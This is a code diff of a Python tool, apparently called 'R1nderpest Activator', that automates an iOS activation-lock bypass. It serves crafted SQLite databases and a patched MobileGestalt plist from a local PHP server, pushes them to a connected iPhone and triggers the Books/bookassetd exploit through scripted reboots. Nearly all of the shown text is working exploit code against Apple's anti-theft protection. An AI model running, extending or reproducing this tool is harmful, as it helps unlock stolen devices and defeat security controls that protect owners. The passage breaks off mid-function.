@@ -70,27 +70,47 @@ class LocalServer:
             return []
 
     def start(self):
-        """Starts the HTTP server in a background thread."""
-        os.chdir(self.serve_dir)
+        """Starts the PHP server in a background process."""
         
-        # Custom handler to log requests
-        class RequestLogger(SimpleHTTPRequestHandler):
-            def log_message(self, format, *args):
-                # Filter out standard logs, print custom colored logs
-                sys.stdout.write(f"{Style.DIM}  [HTTP] {self.address_string()} - {format%args}{Style.RESET}\n")
+        # Create a router.php to handle MIME types correctly
+        router_code = """<?php
+$path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
+$file = __DIR__ . $path;
 
-        self.httpd = TCPServer(("", self.port), RequestLogger)
-        self.thread = threading.Thread(target=self.httpd.serve_forever)
-        self.thread.daemon = True
-        self.thread.start()
+error_log("Request: " . $_SERVER["REQUEST_URI"]);
+
+if (file_exists($file) && !is_dir($file)) {
+    $ext = pathinfo($file, PATHINFO_EXTENSION);
+    if (in_array($ext, ['png', 'sqlitedb', 'plist', 'epub'])) {
+        header('Content-Type: application/octet-stream');
+    }
+    readfile($file);
+    exit;
+}
+error_log("404 Not Found: " . $file);
+return false;
+?>"""
+        with open(os.path.join(self.serve_dir, "router.php"), "w") as f:
+            f.write(router_code)
+
+        print(f"{Style.DIM}  ╰─▶ Starting PHP Server...{Style.RESET}")
+        
+        # Start PHP built-in server
+        cmd = ["php", "-S", f"0.0.0.0:{self.port}", "-t", self.serve_dir, os.path.join(self.serve_dir, "router.php")]
+        
+        # Redirect output to a log file for debugging
+        self.log_file = open("php_server.log", "w")
+        self.process = subprocess.Popen(cmd, stdout=self.log_file, stderr=self.log_file)
         
         print(f"{Style.DIM}  ╰─▶ Local Server running at http://{self.local_ip}:{self.port} (Root: {self.serve_dir}){Style.RESET}")
+        print(f"{Style.DIM}      (PHP logs are being written to 'php_server.log'){Style.RESET}")
         print(f"{Style.DIM}      (If the phone is on a different subnet, this IP might be wrong. Check your Wi-Fi settings.){Style.RESET}")
 
     def stop(self):
-        if self.httpd:
-            self.httpd.shutdown()
-            self.httpd.server_close()
+        if hasattr(self, 'process') and self.process:
+            self.process.terminate()
+        if hasattr(self, 'log_file') and self.log_file:
+            self.log_file.close()
         if os.path.exists(self.serve_dir):
             shutil.rmtree(self.serve_dir)
 
@@ -109,21 +129,25 @@ class PayloadGenerator:
     def _create_db_from_sql(self, sql_content, output_path):
         try:
             # Handle 'unistr' format (Oracle to SQLite conversion for python)
-            # Regex: find unistr('...') and convert \uXXXX to chars
+            # Regex: find unistr('...') or unistr("...") and convert \uXXXX to chars
             def unistr_sub(match):
                 content = match.group(1)
-                # Convert \uXXXX to actual unicode characters
-                # Note: The SQL dump has \\XXXX format, so we look for 4 hex digits
-                decoded = re.sub(r'\\([0-9A-Fa-f]{4})', 
-                               lambda m: binascii.unhexlify(m.group(1)).decode('utf-16-be'), 
-                               content)
+                # Convert \XXXX to actual unicode characters (Python regex for hex is different)
+                # The SQL dump has \0050 format (4 hex digits), so we look for that.
+                # Note: In Python strings, backslash needs escaping.
+                
+                def hex_to_char(m):
+                    try:
+                        return binascii.unhexlify(m.group(1)).decode('utf-16-be')
+                    except:
+                        return m.group(0)
+
+                decoded = re.sub(r'\\([0-9A-Fa-f]{4})', hex_to_char, content)
                 return f"'{decoded}'"
 
-            sql_content = re.sub(r"unistr\s*\(\s*'([^']*)'\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
+            # Replace unistr('...')
+            sql_content = re.sub(r"unistr\s*\(\s*['\"]([^'\"]*)['\"]\s*\)", unistr_sub, sql_content, flags=re.IGNORECASE)
             
-            # Just in case unistr remains (simple cleanup)
-            sql_content = re.sub(r"unistr\s*\(\s*('[^']*')\s*\)", r"\1", sql_content, flags=re.IGNORECASE)
-
             if os.path.exists(output_path): os.remove(output_path)
             
             conn = sqlite3.connect(output_path)
@@ -134,7 +158,19 @@ class PayloadGenerator:
             return True
         except Exception as e:
             print(f"{Style.RED}DB Gen Error: {e}{Style.RESET}")
-            return False
+            # Fallback: Try executing line by line if script fails
+            try:
+                conn = sqlite3.connect(output_path)
+                cursor = conn.cursor()
+                for statement in sql_content.split(';'):
+                    if statement.strip():
+                        try: cursor.execute(statement)
+                        except: pass
+                conn.commit()
+                conn.close()
+                return True
+            except:
+                return False
 
     def generate(self, prd, guid, sn, local_server):
         # Normalize Product ID
@@ -154,7 +190,7 @@ class PayloadGenerator:
         shutil.copy(plist_path, temp_plist)
 
         # Try using the compiled gestalt_hax_v2 patcher first
-        patcher_bin = os.path.join(os.getcwd(), "other", "gestalt_hax_v2", "patcher")
+        patcher_bin = os.path.join(self.asset_root, "other", "gestalt_hax_v2", "patcher")
         patched_via_bin = False
         
         if os.path.exists(patcher_bin):
@@ -183,44 +219,53 @@ class PayloadGenerator:
         plist_path = temp_plist
 
         # 2. Create 'fixedfile' (Zipped Plist)
-        zip_name = f"payload_{token1}.zip"
+        # The device expects a ZIP (EPUB-like) structure.
+        zip_name = f"payload_{token1}.epub" # Use .epub extension
         zip_path = os.path.join(self.server_root, zip_name)
         
         with zipfile.ZipFile(zip_path, 'w') as zf:
-            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist")
+            # Add mimetype file first, uncompressed (Required for valid EPUB)
+            mimetype_path = os.path.join(self.server_root, "mimetype")
+            with open(mimetype_path, "w") as f:
+                f.write("application/epub+zip")
+            zf.write(mimetype_path, "mimetype", compress_type=zipfile.ZIP_STORED)
+            os.remove(mimetype_path)
+            
+            # Add the plist
+            zf.write(plist_path, "Caches/com.apple.MobileGestalt.plist", compress_type=zipfile.ZIP_DEFLATED)
         
-        # Rename to extensionless file as per original exploit
-        fixedfile_name = f"fixedfile_{token1}"
-        fixedfile_path = os.path.join(self.server_root, fixedfile_name)
-        os.rename(zip_path, fixedfile_path)
+        fixedfile_name = zip_name
         fixedfile_url = local_server.get_file_url(fixedfile_name)
 
         # --- 3. Prepare BLDatabaseManager.sqlite ---
-        # Use the reference file from other/bl_sbx/
-        src_bl = os.path.join(os.getcwd(), "other", "bl_sbx", "BLDatabaseManager.sqlite")
-        if not os.path.exists(src_bl):
-            print(f"{Style.RED}[✗] Reference BLDatabaseManager.sqlite missing in other/bl_sbx/{Style.RESET}")
+        # Use SQL template from server/templates
+        bl_sql_path = os.path.join(self.asset_root, "server", "templates", "bl_structure.sql")
+        
+        if not os.path.exists(bl_sql_path):
+            print(f"{Style.RED}[✗] BL SQL template missing: {bl_sql_path}{Style.RESET}")
             return None
             
         token2 = binascii.hexlify(os.urandom(8)).decode()
         bl_db_name = f"belliloveu_{token2}.png"
         bl_db_path = os.path.join(self.server_root, bl_db_name)
-        shutil.copy(src_bl, bl_db_path)
+        
+        try:
+            with open(bl_sql_path, 'r') as f:
+                bl_sql_content = f.read()
+            
+            # Replace placeholder with URL
+            bl_sql_content = bl_sql_content.replace('KEYOOOOOO', fixedfile_url)
+            
+            print(f"{Style.DIM}  ╰─▶ Generating BLDatabaseManager from SQL...{Style.RESET}")
+            if not self._create_db_from_sql(bl_sql_content, bl_db_path):
+                print(f"{Style.RED}[✗] Failed to create BLDatabaseManager from SQL{Style.RESET}")
+                return None
+                
+        except Exception as e:
+            print(f"{Style.RED}[✗] Failed to prepare BLDatabaseManager: {e}{Style.RESET}")
+            return None
         
         bl_url = local_server.get_file_url(bl_db_name)
-        
-        # Update BL DB
-        try:
-            conn = sqlite3.connect(bl_db_path)
-            c = conn.cursor()
-            # Update URL to point to our payload
-            # The reference DB uses ZURL for the payload URL
-            c.execute("UPDATE ZBLDOWNLOADINFO SET ZURL=? WHERE Z_PK=1", (fixedfile_url,))
-            conn.commit()
-            conn.close()
-        except Exception as e:
-            print(f"{Style.RED}[✗] Failed to update BLDatabaseManager: {e}{Style.RESET}")
-            return None
 
         # Create dummy WAL/SHM for BL DB (empty files)
         wal_name = f"belliloveu_{token2}_wal.png"
@@ -231,53 +276,62 @@ class PayloadGenerator:
         wal_url = local_server.get_file_url(wal_name)
         shm_url = local_server.get_file_url(shm_name)
 
+        # Create dummy iTunesMetadata.plist (Valid empty plist)
+        meta_name = f"metadata_{token2}.plist"
+        # Create a more complete dummy plist to mimic real structure if needed, 
+        # but empty dict is usually fine. Let's add some basic keys just in case.
+        dummy_plist = {
+            "artistName": "Apple Inc.",
+            "playlistName": "Purchased",
+            "itemName": "iBooks",
+            "itemId": 123456789
+        }
+        with open(os.path.join(self.server_root, meta_name), 'wb') as f:
+            plistlib.dump(dummy_plist, f) 
+        
+        meta_url = local_server.get_file_url(meta_name)
+
         # --- 4. Prepare downloads.28.sqlitedb ---
-        # Use the reference file from other/bl_sbx/
-        src_dl = os.path.join(os.getcwd(), "other", "bl_sbx", "downloads.28.sqlitedb")
-        if not os.path.exists(src_dl):
-            print(f"{Style.RED}[✗] Reference downloads.28.sqlitedb missing in other/bl_sbx/{Style.RESET}")
+        # Use SQL template from server/templates
+        dl_sql_path = os.path.join(self.asset_root, "server", "templates", "downloads_structure.sql")
+
+        if not os.path.exists(dl_sql_path):
+            print(f"{Style.RED}[✗] Downloads SQL template missing: {dl_sql_path}{Style.RESET}")
             return None
 
         token3 = binascii.hexlify(os.urandom(8)).decode()
         final_db_name = f"downloads_{token3}.sqlitedb"
         final_db_path = os.path.join(self.server_root, final_db_name)
-        shutil.copy(src_dl, final_db_path)
         
-        # Update Downloads DB
         try:
-            conn = sqlite3.connect(final_db_path)
-            c = conn.cursor()
+            with open(dl_sql_path, 'r') as f:
+                dl_sql_content = f.read()
             
-            # Template GUID to replace
-            TEMPLATE_GUID = "3DBBBC39-F5BA-4333-B40C-6996DE48F91C"
+            # Replace placeholders in SQL (new format from working hanakim3945 DB)
+            # The template has URLs like: https://your_domain_here/fileprovider.php?type=sqlite
+            server_base = f"http://{local_server.local_ip}:{local_server.port}"
             
-            # Helper to update asset
-            def update_asset(pid, new_url):
-                # Get current local_path
-                c.execute("SELECT local_path FROM asset WHERE pid=?", (pid,))
-                row = c.fetchone()
-                if row:
-                    curr_path = row[0]
-                    if curr_path:
-                        new_path = curr_path.replace(TEMPLATE_GUID, guid)
-                        c.execute("UPDATE asset SET url=?, local_path=? WHERE pid=?", (new_url, new_path, pid))
-                    else:
-                        # Fallback if local_path is null (shouldn't happen for these assets)
-                        c.execute("UPDATE asset SET url=? WHERE pid=?", (new_url, pid))
+            # Replace URL placeholders with our server URLs
+            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=sqlite', bl_url)
+            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blshm', shm_url)
+            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=blwal', wal_url)
+            dl_sql_content = dl_sql_content.replace('https://your_domain_here/fileprovider.php?type=itunes', meta_url)
+            
+            # Legacy fallbacks (keep for compatibility)
+            dl_sql_content = dl_sql_content.replace('URL_METADATA', meta_url)
+            dl_sql_content = dl_sql_content.replace('URL_WAL', wal_url)
+            dl_sql_content = dl_sql_content.replace('URL_SHM', shm_url)
+            dl_sql_content = dl_sql_content.replace('URL_DB', bl_url)
+            dl_sql_content = dl_sql_content.replace('https://google.com', bl_url)
+            dl_sql_content = dl_sql_content.replace('GOODKEY', guid)
+            
+            print(f"{Style.DIM}  ╰─▶ Generating downloads.28.sqlitedb from SQL...{Style.RESET}")
+            if not self._create_db_from_sql(dl_sql_content, final_db_path):
+                print(f"{Style.RED}[✗] Failed to create downloads DB from SQL{Style.RESET}")
+                return None
 
-            # PID 1234567890: Main DB
-            update_asset(1234567890, bl_url)
-            # PID 1234567891: SHM
-            update_asset(1234567891, shm_url)
-            # PID 1234567892: WAL
-            update_asset(1234567892, wal_url)
-            # PID 1234567893: Metadata (Optional, point to main or dummy)
-            update_asset(1234567893, bl_url)
-            
-            conn.commit()
-            conn.close()
         except Exception as e:
-            print(f"{Style.RED}[✗] Failed to update downloads DB: {e}{Style.RESET}")
+            print(f"{Style.RED}[✗] Failed to generate downloads DB: {e}{Style.RESET}")
             return None
         
         return final_db_path
@@ -315,11 +369,151 @@ class BypassAutomation:
             return 124, (e.stdout or "").strip(), (e.stderr or "").strip()
         except Exception as e: return 1, "", str(e)
 
+    def is_device_connected(self):
+        """Check if the device is currently connected and responsive."""
+        code, _, _ = self._run_cmd(["ideviceinfo", "-k", "UniqueDeviceID"], timeout=5)
+        return code == 0
+
+    def wait_for_device_disconnect(self, timeout=60, poll_interval=1):
+        """
+        Poll until the device disappears (disconnects).
+        Returns True if device disconnected, False if timeout reached.
+        """
+        self.log("Waiting for device to disconnect...", "detail")
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            if not self.is_device_connected():
+                self.log("Device disconnected.", "detail")
+                return True
+            time.sleep(poll_interval)
+        self.log("Timeout waiting for device to disconnect.", "warn")
+        return False
+
+    def wait_for_device_reconnect(self, timeout=120, poll_interval=2):
+        """
+        Poll until the device reappears (reconnects).
+        Returns True if device reconnected, False if timeout reached.
+        """
+        self.log("Waiting for device to reconnect...", "detail")
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            if self.is_device_connected():
+                self.log("Device reconnected.", "success")
+                return True
+            time.sleep(poll_interval)
+        self.log("Timeout waiting for device to reconnect.", "error")
+        return False
+
+    def wait_for_device_services_ready(self, timeout=60, poll_interval=2):
+        """
+        Poll until device services are fully ready by checking battery info.
+        This is more thorough than just checking connection.
+        """
+        self.log("Waiting for device services to be ready...", "detail")
+        start_time = time.time()
+        while time.time() - start_time < timeout:
+            code, _, _ = self._run_cmd(["ideviceinfo", "-q", "com.apple.mobile.battery"], timeout=5)
+            if code == 0:
+                self.log("Device services ready.", "success")
+                return True
+            time.sleep(poll_interval)
+        self.log("Device services not fully ready, continuing anyway...", "warn")
+        return False
+
+    def _parse_device_path(self, path):
+        """
+        Parse a device path into directory and filename components.
+        Returns tuple (directory, filename).
+        """
+        directory = "/".join(path.split("/")[:-1]) or "/"
+        filename = path.split("/")[-1]
+        return directory, filename
+
+    def wait_for_file_on_device(self, path, timeout=300, poll_interval=5):
+        """
+        Poll until a specific file appears on the device via AFC.
+        Returns True if file found, False if timeout reached.
+        """
+        self.log(f"Waiting for file: {path}...", "detail")
+        start_time = time.time()
+        
+        directory, filename = self._parse_device_path(path)
+        
+        while time.time() - start_time < timeout:
+            if self.afc_mode == "ifuse":
+                file_path = os.path.join(self.mount_point, path.lstrip("/"))
+                if os.path.exists(file_path):
+                    self.log(f"File found: {path}", "success")
+                    return True
+            else:
+                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", directory])
+                if code == 0 and filename in out:
+                    self.log(f"File found: {path}", "success")
+                    return True
+            time.sleep(poll_interval)
+        
+        self.log(f"Timeout waiting for file: {path}", "warn")
+        return False
+
+    def wait_for_file_removal(self, path, timeout=300, poll_interval=5):
+        """
+        Poll until a specific file disappears from the device via AFC.
+        Returns True if file removed, False if timeout reached.
+        """
+        self.log(f"Waiting for file removal: {path}...", "detail")
+        start_time = time.time()
+        
+        directory, filename = self._parse_device_path(path)
+        
+        while time.time() - start_time < timeout:
+            if self.afc_mode == "ifuse":
+                file_path = os.path.join(self.mount_point, path.lstrip("/"))
+                if not os.path.exists(file_path):
+                    self.log(f"File removed: {path}", "success")
+                    return True
+            else:
+                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", directory])
+                if code != 0 or filename not in out:
+                    self.log(f"File removed: {path}", "success")
+                    return True
+            time.sleep(poll_interval)
+        
+        self.log(f"Timeout waiting for file removal: {path}", "warn")
+        return False
+
+    def reboot_device_and_wait(self, timeout=120):
+        """
+        Reboot the device and wait for it to reconnect using polling.
+        First waits for disconnect, then waits for reconnect.
+        """
+        self.log("Initiating device reboot...", "info")
+        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
+        
+        # Wait for device to disconnect (indicates reboot started)
+        if not self.wait_for_device_disconnect(timeout=30, poll_interval=1):
+            self.log("Reboot command may have failed or device is unresponsive, proceeding to reconnect wait...", "warn")
+        
+        # Wait for device to reconnect
+        if not self.wait_for_device_reconnect(timeout=timeout, poll_interval=2):
+            return False
+        
+        # Wait for services to be fully ready
+        self.wait_for_device_services_ready(timeout=30, poll_interval=2)
+        return True
+
     def verify_dependencies(self):
         self.log("Verifying System Requirements...", "step")
         # Check for assets/Maker
         if not os.path.isdir(os.path.join(os.getcwd(), "assets", "Maker")):
             self.log("Missing 'assets/Maker' folder in current directory.", "error")
+            sys.exit(1)
+
+        # Check for pymobiledevice3
+        if not shutil.which("pymobiledevice3"):
+            self.log("pymobiledevice3 not found in PATH. Please install it (pip3 install pymobiledevice3).", "error")
+            # If running with sudo, suggest -E or full path
+            if os.geteuid() == 0:
+                self.log("If you installed it as a user, try running with 'sudo -E python3 ...' or install it globally.", "warn")
             sys.exit(1)
 
         if shutil.which("ifuse"): self.afc_mode = "ifuse"
@@ -421,19 +615,27 @@ class BypassAutomation:
 
         self.log("Device folders cleaned.", "success")
 
+    def check_wifi_sync(self):
+        # Removed as per user request
+        pass
+
     def get_guid(self):
-        self.log("Extracting GUID (Robust Method)...", "step")
+        self.log("Extracting GUID...", "step")
         
-        # 1. Clean folders first (Crucial step from A12Bypass.py)
-        self.cleanup_media_folders()
-        
-        # 2. Collect Log Archive
-        self.log("Collecting system logs (this may take a moment)...", "info")
+        # Regex to find the GUID in the path
+        patterns = [
+            r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabaseManager',
+            r'([A-F0-9]{8}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{4}-[A-F0-9]{12})/Documents/BLDatabase',
+            r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/'
+        ]
+
+        # --- Method: Slow Archive (Reliable) ---
+        self.log("Collecting system logs (this takes a few minutes)...", "info")
         udid = self.device_info['UniqueDeviceID']
         log_path = f"{udid}.logarchive"
         if os.path.exists(log_path): shutil.rmtree(log_path)
         
-        # Increased timeout for log collection
+        # Collect logs
         self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=180)
         
         if os.path.exists(log_path):
@@ -441,56 +643,131 @@ class BypassAutomation:
             if os.path.exists(tmp): shutil.rmtree(tmp)
             shutil.move(log_path, tmp)
             
-            self.log("Parsing logs for BLDatabaseManager...", "detail")
-            # Use 'log show' to filter for relevant entries
-            _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp, "--predicate", 'process == "mobileactivationd" OR process == "itunesstored"'])
-            
-            # Also try a broader search if the predicate misses it
-            if "BLDatabaseManager" not in logs:
-                 _, logs, _ = self._run_cmd(["/usr/bin/log", "show", "--style", "syslog", "--archive", tmp])
+            self.log("Parsing logs...", "detail")
+            # Broad search: Get everything containing "SystemGroup" or "BLDatabase"
+            # We avoid strict process filtering to be more robust
+            _, logs, _ = self._run_cmd([
+                "/usr/bin/log", "show", 
+                "--style", "syslog", 
+                "--archive", tmp, 
+                "--predicate", 
+                'eventMessage CONTAINS "SystemGroup" OR eventMessage CONTAINS "BLDatabase"'
+            ])
 
             shutil.rmtree(tmp)
             
-            # Regex to find the GUID in the path
-            # Pattern: SystemGroup/<GUID>/Documents/BLDatabaseManager
-            guid_pattern = re.compile(r'SystemGroup/([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})/')
-            
             for line in logs.splitlines():
-                if "BLDatabaseManager" in line:
-                    match = guid_pattern.search(line)
+                for pattern in patterns:
+                    match = re.search(pattern, line, re.IGNORECASE)
                     if match: 
                         found = match.group(1).upper()
                         self.log(f"Found GUID: {found}", "success")
                         return found
-                    
+            
+            # Fallback: Try Books method if logs failed
+            self.log("Log method failed. Trying Books method...", "warn")
+            try:
+                self._run_cmd(["pymobiledevice3", "processes", "launch", "com.apple.iBooks"])
+                time.sleep(5)
+            except:
+                pass
+
         self.log("Could not find GUID in logs.", "error")
         return None
 
+    def transfer_plist_to_books(self):
+        """
+        Copies iTunesMetadata.plist from iTunes_Control to Books.
+        This mimics the behavior of the Strawhat fork.
+        """
+        self.log("Transferring iTunesMetadata.plist to Books...", "step")
+        
+        src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
+        dst = "/Books/iTunesMetadata.plist" # Renaming to match source filename, Strawhat does this.
+        
+        # Check if source exists
+        if self.afc_mode == "ifuse":
+            src_path = os.path.join(self.mount_point, src.lstrip("/"))
+            dst_path = os.path.join(self.mount_point, dst.lstrip("/"))
+            
+            if os.path.exists(src_path):
+                try:
+                    shutil.copy(src_path, dst_path)
+                    self.log("Copied plist to Books (ifuse).", "success")
+                    return True
+                except Exception as e:
+                    self.log(f"Failed to copy plist: {e}", "error")
+                    return False
+            else:
+                self.log("Source plist not found in iTunes_Control.", "warn")
+                return False
+        else:
+            # pymobiledevice3
+            # We need to download then upload
+            local_temp = "temp_metadata.plist"
+            
+            # Check existence (ls)
+            code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/iTunes_Control/iTunes"])
+            if "iTunesMetadata.plist" not in out:
+                self.log("Source plist not found in iTunes_Control.", "warn")
+                return False
+                
+            # Pull
+            self._run_cmd(["pymobiledevice3", "afc", "pull", src, local_temp])
+            
+            if os.path.exists(local_temp):
+                # Push
+                self._run_cmd(["pymobiledevice3", "afc", "push", local_temp, dst])
+                os.remove(local_temp)
+                self.log("Copied plist to Books (pymobiledevice3).", "success")
+                return True
+            else:
+                self.log("Failed to pull plist from device.", "error")
+                return False
+
+    def monitor_server_log(self):
+        """
+        Reads the PHP server log file and prints new lines to the console.
+        This helps verify if the device is actually requesting the files.
+        """
+        log_path = "php_server.log"
+        if not os.path.exists(log_path): return
+
+        with open(log_path, "r") as f:
+            # Go to the end of the file
+            f.seek(0, 2)
+            
+            while True:
+                line = f.readline()
+                if line:
+                    print(f"{Style.DIM}      [SERVER LOG] {line.strip()}{Style.RESET}")
+                else:
+                    time.sleep(0.5)
+                
+                if not hasattr(self, 'server') or not self.server.process:
+                    break
+
     def run(self):
         os.system('clear')
-        print(f"{Style.BOLD}{Style.MAGENTA}iOS Offline Activator (Python Edition){Style.RESET}\n")
+        print(f"{Style.BOLD}{Style.MAGENTA}R1nderpest Activator{Style.RESET}\n")
         
         self.verify_dependencies()
         self.server.start() # Start HTTP server
         self.detect_device()
+        # self.check_wifi_sync() # Removed
         
         print(f"{Style.YELLOW}Starting in 5 seconds...{Style.RESET}")
         time.sleep(5)
         
-        # 1. Reboot
-        self.log("Rebooting device...", "step")
-        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
-        time.sleep(30)
-        
-        # 2. Get GUID
+        # --- Extract GUID from device ---
         self.guid = self.get_guid()
+
         if not self.guid:
             self.log("Could not find GUID in logs.", "error")
             sys.exit(1)
-        self.log(f"GUID: {self.guid}", "success")
         
         # 3. Generate Payloads (Offline Logic)
-        self.log("Generating Payload (Offline)...", "step")
+        self.log("Generating Payload...", "step")
         final_db_path = self.generator.generate(
             self.device_info['ProductType'], 
             self.guid, 
@@ -501,7 +778,12 @@ class BypassAutomation:
         if not final_db_path:
             self.log("Payload generation failed.", "error")
             sys.exit(1)
-        self.log("Payload Generated Successfully.", "success")
+        self.log("Payload Generated.", "success")
+
+        # DEBUG: List generated files
+        print(f"{Style.DIM}  [DEBUG] Generated files in server root:{Style.RESET}")
+        for f in os.listdir(self.server.serve_dir):
+            print(f"{Style.DIM}    - {f}{Style.RESET}")
 
         # 4. Upload
         self.log("Uploading...", "step")
@@ -526,52 +808,199 @@ class BypassAutomation:
             
         self.log("Payload Deployed.", "success")
         
+        # Start Server Log Monitor
+        threading.Thread(target=self.monitor_server_log, daemon=True).start()
+        
         # 5. Execution Sequence
-        print(f"\n{Style.YELLOW}{Style.BOLD}IMPORTANT: Ensure the device is connected to the SAME Wi-Fi as this computer!{Style.RESET}")
         print(f"Server IP: {self.server.local_ip}")
         
-        # Wait 30 seconds before first reboot (as per A12Bypass.py recommendation)
-        self.log("Waiting 30 seconds before first reboot to ensure filesystem sync...", "info")
-        time.sleep(30)
+        # Wait for filesystem sync by polling device readiness instead of hard 30s sleep
+        self.log("Verifying filesystem sync before reboot...", "info")
+        self.wait_for_device_services_ready(timeout=30, poll_interval=2)
 
         self.log("Rebooting (Stage 1/2)...", "step")
-        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
-        
-        self.log("Waiting for device to reboot (90s)...", "info")
-        time.sleep(90)
-        
-        # Wait for device to be detected again
-        self.log("Waiting for USB connection...", "detail")
-        while True:
-            if self._run_cmd(["ideviceinfo"])[0] == 0: break
-            time.sleep(5)
-        self.log("Device reconnected.", "success")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after Stage 1/2 reboot", "error")
+            sys.exit(1)
 
-        self.log("Rebooting (Stage 2/2) - Triggering Exploit...", "step")
-        self._run_cmd(["pymobiledevice3", "diagnostics", "restart"])
-        
-        print(f"\n{Style.GREEN}Process Complete. Device should activate after this reboot.{Style.RESET}")
-        
-        # Check Activation State
-        self.log("Checking Activation State in 60 seconds...", "info")
-        time.sleep(60)
-        code, out, _ = self._run_cmd(["ideviceinfo"])
-        if "ActivationState: Activated" in out:
-             print(f"\n{Style.BOLD}{Style.GREEN}🎉 DEVICE ACTIVATED SUCCESSFULLY! 🎉{Style.RESET}")
-        else:
-             print(f"\n{Style.YELLOW}Device not yet activated (or check failed). You may need to try again or wait longer.{Style.RESET}")
-             # Print actual state for debugging
-             for line in out.splitlines():
-                 if "ActivationState" in line:
-                     print(f"Current Status: {line.strip()}")
+        # Wait for system stabilization by polling services ready
+        self.log("Waiting for system stabilization...", "info")
+        self.wait_for_device_services_ready(timeout=60, poll_interval=2)
 
-        # Keep script alive for server to serve files if needed by device immediately
-        self.log("Keeping server alive for 30s to ensure downloads complete...", "info")
-        self.log("Watch for [HTTP] requests below. If none appear, the device isn't connecting.", "detail")
+        # --- Prompt user to open Books app manually ---
+        print(f"\n{Style.BOLD}{Style.YELLOW}*** MANUAL ACTION REQUIRED ***{Style.RESET}")
+        print(f"{Style.YELLOW}Please open the Books app on your device NOW!{Style.RESET}")
+        print(f"{Style.YELLOW}Then press Enter to continue...{Style.RESET}")
+        input()
+
+        # --- ADDED: Plist Transfer (Strawhat Logic) ---
+        self.transfer_plist_to_books()
+
+        # --- 6. Reboot Sequence (Matching A12 2.sh) ---
+        
+        # Reboot 1 (Already done above as "Stage 1/2" in previous code, but let's align with bash script)
+        # The bash script does:
+        # 1. Upload DB
+        # 2. Reboot (First Reboot)
+        # 3. Wait for iTunesMetadata.plist
+        # 4. Reboot (Second Reboot)
+        # 5. Wait for asset.epub
+        # 6. Wait for iTunesMetadata.plist to disappear
+        # 7. Cleanup
+        # 8. Reboot (Final Reboot)
+        
+        # We just finished Reboot 1 (Stage 1/2 in old code).
+        # Now we verify iTunesMetadata.plist
+        
+        self.log("Verifying iTunesMetadata.plist...", "step")
+        metadata_path = "/iTunes_Control/iTunes/iTunesMetadata.plist"
+        found_metadata = False
+        
+        # Wait up to 20s using polling
+        found_metadata = self.wait_for_file_on_device("/iTunes_Control/iTunes/iTunesMetadata.plist", timeout=20, poll_interval=1)
+            
+        if not found_metadata:
+            self.log("iTunesMetadata.plist not found (continuing anyway...)", "warn")
+
+        # Reboot 2
+        self.log("Rebooting (Stage 2/3)...", "step")
+        if not self.reboot_device_and_wait(timeout=120):
+            self.log("Failed to reconnect after Stage 2/3 reboot", "error")
+            sys.exit(1)
+
+        # Wait for bookassetd to process BLDatabaseManager using polling
+        self.log("Waiting for bookassetd to process BLDatabaseManager...", "info")
+        
+        # Launch iBooks to trigger bookassetd to read BLDatabaseManager
+        self.log("Launching iBooks to trigger bookassetd...", "info")
         try:
-            time.sleep(30)
-        except KeyboardInterrupt:
-            print("\nStopping server...")
+            self._run_cmd(["pymobiledevice3", "apps", "launch", "com.apple.iBooks"])
+        except:
+            try:
+                self._run_cmd(["pymobiledevice3", "processes", "launch", "com.apple.iBooks"])
+            except:
+                self.log("Could not launch iBooks automatically", "warn")
+        
+        # Poll for epub request in server log instead of hard 60s wait
+        start_time = time.time()
+        max_wait = 60
+        while time.time() - start_time < max_wait:
+            try:
+                with open("php_server.log", "r") as f:
+                    content = f.read()
+                    if "payload_" in content and ".epub" in content:
+                        self.log("Server received epub request!", "success")
+                        break
+            except:
+                pass
+            time.sleep(2)
+
+        # Monitor asset.epub (Exploit Trigger)
+        self.log("Waiting for asset.epub (Exploit Trigger)...", "step")
+        found_asset = False
+        
+        # Wait up to 300s
+        for i in range(60): # Check every 5s for 300s
+            # Check /Books/asset.epub
+            code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
+            if "asset.epub" in out or "asset" in out: # Loose match as per bash script
+                 self.log("asset.epub detected!", "success")
+                 found_asset = True
+                 break
+            
+            # Debug: Show what IS there
+            if i % 4 == 0: # Every 20s
+                # Check /Books
+                code, out, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Books"])
+                files = [f for f in out.splitlines() if f not in ['.', '..', '']]
+                print(f"\n{Style.DIM}      [DEBUG] /Books: {files}{Style.RESET}")
+
+                # Check /Downloads (To see if temp files are stuck there)
+                code_dl, out_dl, _ = self._run_cmd(["pymobiledevice3", "afc", "ls", "/Downloads"])
+                files_dl = [f for f in out_dl.splitlines() if f not in ['.', '..', '']]
+                if files_dl:
+                    print(f"{Style.DIM}      [DEBUG] /Downloads: {files_dl}{Style.RESET}")
+                
+                # Check if server is still alive
+                if self.server.process.poll() is not None:
